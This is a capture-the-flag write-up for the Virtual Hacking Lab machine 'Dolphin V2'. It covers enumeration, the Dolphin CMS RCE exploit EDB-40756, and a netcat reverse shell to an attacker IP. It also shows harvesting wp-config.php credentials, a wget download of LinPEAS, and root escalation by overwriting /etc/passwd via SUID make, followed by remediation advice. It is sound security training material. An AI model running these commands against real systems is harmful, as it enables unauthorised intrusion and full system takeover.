#  Dolphin V2 - Virtual Hacking Lab

| Info          | Details                                                                           |
| ------------- | --------------------------------------------------------------------------------- |
| Platform      | Virtual Hacking Lab                                                               |
| Difficulty    | Advance                                                                           |
| Target IP     | 10.11.1.58                                                                        |
| OS            | Linux                                                                             |
| Vulnerability | Dolphin CMS RCE, Credential Disclosure, SUID Misconfiguration (make)              |
| Tools Used    | Nmap, Gobuster, Dirsearch, WPScan, Searchsploit, Netcat, John the Ripper, LinPEAS |

## Attack Path

1. Nmap scan discovered open services on ports 21, 22, 80, and 81.
2. Gobuster and dirsearch identified /administration and /wordpress directories.
3. Searchsploit identified a public unauthenticated RCE exploit for Dolphin CMS (EDB-40756).
4. The exploit was executed, delivering a web shell and initial access as www-data.
5. Shell was stabilised using BusyBox netcat and Python PTY spawn.
6. wp-config.php revealed cleartext MySQL credentials.
7. Database was accessed and a WordPress password hash extracted (not crackable).
8. LinPEAS identified a SUID misconfiguration on /usr/bin/make.
9. GTFOBins technique used to overwrite /etc/passwd with a root-equivalent user.
10. Root shell obtained; flag retrieved from /root/key.txt.

## Environment Setup

First, create a working directory and files to organize enumeration results.

```bash
mkdir dolphin_v2
cd dolphin_v2
mkdir nmap gobuster exploit
touch users.txt creds.txt
echo 'Testing....1...2...3...' > test.txt
```
## Network Scanning

Identify the target IP and perform a full port scan.

```bash
ip='10.11.1.58'
## Regular Scan + Version
sudo nmap -Pn -n $ip -sC -sV -p- --open -oN nmap/nmap.log
```

Reminder:
1. Check all the version
2. Check all the open ports

[Results](ss/1.png)

Results
- Port 21/TCP — FTP service identified
- Port 22/TCP — SSH service identified (OpenSSH)
- Port 80/TCP — HTTP web server running Dolphin CMS 
- Port 81/TCP — Secondary HTTP service
## FTP enumeration

Attempt anonymous login:

```bash
ftp $ip
anonymous::anonymous
```

[Results](ss/2.png)

Results: Anonymous login was denied. The FTP service was noted as a potential attack surface but was deprioritised in favour of the HTTP service.
## Web Enumeration

Web App page: **The primary web application on port 80 was identified as Dolphin CMS.**

[Results](ss/3.png)

Web directory brute-forcing was conducted using Gobuster and dirsearch to identify hidden content and administrative interfaces.

``` bash
# Gobuster
gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -o gobuster/dir.log -t 42

# dirsearch
dirsearch -u $ip
```

Gobuster:

[Results](ss/4.png)

Directory Discovered:

```bash
/administration
/wordpress
```

/administration:

[Results](ss/5.png)

The presence of a WordPress installation prompted further targeted enumeration using WPScan

## wpscan enumeration

```bash
wpscan --update

wpscan --url http://$ip --enumerate p --plugins-detection aggressive
```

Results: **WPScan identified three outdated plugins. After manual vulnerability research for each plugin, no directly exploitable CVEs with public proof-of-concept code were identified. The WordPress attack vector was deprioritised.**

## Vulnerability Search

Searchsploit was used to search for known vulnerabilities in Dolphin CMS

```bash
searchsploit dolphin 
```

[Results](ss/7.png)

Results: 
- EDB-ID 40756 — Dolphin CMS Unauthenticated Remote Code Execution
- EDB-ID 17994 — Dolphin CMS additional vulnerability (not used)

**Exploit 40756 was selected and mirrored locally for review and execution:**

```bash
searchsploit -m 40756

# execute the exploit
python2 40756.py http://10.11.1.58
```

[Results](ss/6.png)

Results: **The exploit successfully delivered a web shell, resulting in remote command execution on the target system as the www-data user. Initial shell access was confirmed.**

## Shell Stabilisation

**The initial shell obtained via the exploit was unstable and lacked full TTY functionality. Shell stabilisation was performed using BusyBox netcat for a persistent reverse shell, followed by a Python PTY upgrade:**

```bash
# get a stable reverse shell
busybox nc 172.16.1.1 4444 -e sh

# upgrade the shell 
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Results: **A stable, interactive bash shell was obtained as www-data. Further enumeration of the file system was then conducted.**
## Webshell Enumeration

During file system enumeration, the WordPress configuration file was inspected. WordPress stores database credentials in plaintext within wp-config.php, which is a well-known credential harvesting target during post-exploitation:

```bash
cat /var/www/html/wordpress/wp-config.php
```

[Results](ss/8.png)

Results: Database credentials were discovered in cleartext:

`wordpress::P4aSsVV0rD!3`
## Database Enumeration

Using the credentials recovered from wp-config.php, the MySQL database was accessed and enumerated to identify user accounts and password hashes:

```bash
mysql -u wordpress -p
P4aSsVV0rD!3

show databases;
use wordpress;
show tables;
SELECT user_login, user_pass FROM wp_users;
```

[Results](ss/9.png)

Results: A WordPress user account was retrieved with a phpass-format password hash. The hash was extracted for offline cracking attempts.
## Password Cracking

The recovered phpass hash was subjected to offline dictionary attack using John the Ripper with the rockyou.txt wordlist:

```bash
echo '$P$BI2TXgSf/gAL69uUCkj02PbsmSNKIV/' > pass.txt

john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass pass.txt
```

Results: The password cracking attempt was unsuccessful; the hash was not found within the rockyou.txt dictionary. This attack vector was deprioritized and privilege escalation via other means was pursued.
# Privilege Escalations

LinPEAS was transferred to the target and executed to automate privilege escalation enumeration:

```bash
wget http://172.16.1.2/linpeas.sh && chmod +x linpeas.sh

./linpeas.sh
```

[Results](ss/10.png)

Results: LinPEAS identified a critical SUID misconfiguration: /usr/bin/make was configured with the SUID bit set, allowing execution with elevated privileges.

The GTFOBins project documents that the make binary can be abused to write arbitrary files when SUID is set. This was leveraged to overwrite /etc/passwd and inject a new root-equivalent user:

```bash
## lets overwrite /etc/passwd
openssl passwd Hacker123

## Exploit OpenSSL to overwrite `/etc/passwd`:
echo "hacker:MViEYUA3.VKek:0:0:root:/root:/bin/bash" 

make -s --eval='$(file >/etc/passwd,hacker:MViEYUA3.VKek:0:0:root:/root:/bin/bash)' .

# Verify
cat /etc/passwd
```

[Results](ss/11.png)

Results: The /etc/passwd file was successfully overwritten to include a new account (hacker) with UID 0 (root-equivalent), password hash MViEYUA3.VKek, and a bash login shell. The write operation succeeded due to the SUID bit granting elevated file system permissions.

With the malicious user entry written to /etc/passwd, the hacker account was used to switch to root context:

```bash
su hacker
Hacker123

whoami
id
cat /root/key.txt
```

[Results](ss/12.png)

Results: Full root access was confirmed. The root flag was successfully retrieved from /root/key.txt, completing the machine

# Remediation

## 1. Unauthenticated Remote Code Execution in Dolphin CMS

- Update Dolphin CMS to a secure version.
- Remove or patch vulnerable components.

---
## 2. Secure Configuration Files

- Restrict access to:
`/var/www/html/wordpress/wp-config.php`

- Store credentials outside web root if possible.
---
## 3. Remove Dangerous SUID Binaries

- Remove SUID permission from:

`/usr/bin/make`

Audit with:

`find / -perm -u=s -type f 2>/dev/null`

---

## 4. Enforce Least Privilege

- Prevent web users from accessing sensitive system files.
- Limit execution permissions.

---
## 5. Disable Unnecessary Services

- Disable FTP if not required.
- Reduce attack surface.

---

